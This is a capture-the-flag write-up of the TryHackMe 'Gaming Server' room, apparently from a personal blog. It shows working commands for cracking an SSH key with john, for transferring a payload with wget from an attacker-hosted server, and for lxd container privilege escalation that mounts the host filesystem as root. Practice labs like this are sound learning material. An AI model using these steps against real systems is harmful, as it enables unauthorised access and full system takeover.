---
layout: post
title: Tryhackme - Gaming Server
date: 2020-11-25 19:00:00 +0000
category: [Tryhackme, Easy]
tags: [thm,linux,easy,lxd,boot2root]
---

---
Gaming server is a beginner level room in Tryhackme. The final objective is to get the user and root flag.

<br>
![cover_image](/assets/img/tryhackme/gamingserver/1.png)

**Author** | SuitGuy
**Description** | An Easy Boot2Root box for beginners.


<p>Deploy the VM and lets go.</p>

## <ins>Enumeration</ins>
---
Let's start with a nmap scan.
<br>
![nmap_scan](/assets/img/tryhackme/gamingserver/nmap_scan.png)
<br>
Only the ssh and the http ports are open. Let's check out the http service first.
<br>
![http_service](/assets/img/tryhackme/gamingserver/10.png)

In the source page I found this comment which tells us the username.
<br>
![username_identification](/assets/img/tryhackme/gamingserver/4.png)
<br>

Run gobuster to see if there are any hidden directories.
<br>
<pre>gobuster dir -u http://id-addr/ -w /usr/share/dirb/wordlists/common.txt</pre>
<br>
![gobuster_result](/assets/img/tryhackme/gamingserver/2.png)
<br>
I went to the ```/secret``` directory which is the most interesting of all and found the ssh private key.
<br>

![secretkey](/assets/img/tryhackme/gamingserver/3.png)
<br>
Just copy the contents of the file to your local machine.

Use ```ssh2john``` to convert it into hash.
<br>
<pre>/usr/share/john/ssh2john id_rsa > hash</pre>
<br>
And ```john``` to crack the password.
<br>
<pre>john --format=SSH hash ~/Wordlists/rockyou.txt</pre>
<br>
![privkey_pass](/assets/img/tryhackme/gamingserver/5.png)
<br>


## <ins>User flag</ins>
---
Without wait let's login to ssh.
<br>
<pre>ssh john@ip-addr -i id_rsa</pre>
<br>
![ssh_login](/assets/img/tryhackme/gamingserver/6.png)
<br>
Boom!! We got the user flag.

## <ins>Root flag</ins>
---
After some enumeration I found that the user ```john``` has ```lxd``` priviledges.
<br>
![id_enum](/assets/img/tryhackme/gamingserver/7.png)
<br>

I searched google for ```lxd priviledge escalation``` and found this amazing article from [hacking articles](https://www.hackingarticles.in/lxd-privilege-escalation/).

Just follow the steps. First, clone the github repository in your local machine
<br>
<pre>
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
</pre>
<br>
Then run the executable as root.
<pre>sudo ./build-alpine</pre>
<br>
A tar file will be generated. From your local machine open a python server.
<br>
<pre>python -m SimpleHTTPServer 8080</pre>
<br>
And download the file from the remote machine using wget.
<br>
<pre>wget http://your-vpn-ip:8080/tar-file-name</pre>
<br>

Then run the following commands.
<pre>
lxc image import ./tar-file-name --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
</pre>

<br>
![root_shell](/assets/img/tryhackme/gamingserver/8.png)
<br>
The root flag can be found in the ```/mnt/root/root``` directory.

<br>
![root_flag](/assets/img/tryhackme/gamingserver/9.png)
<br>

Box rooted!!

That's it folks. Happy hacking!!!
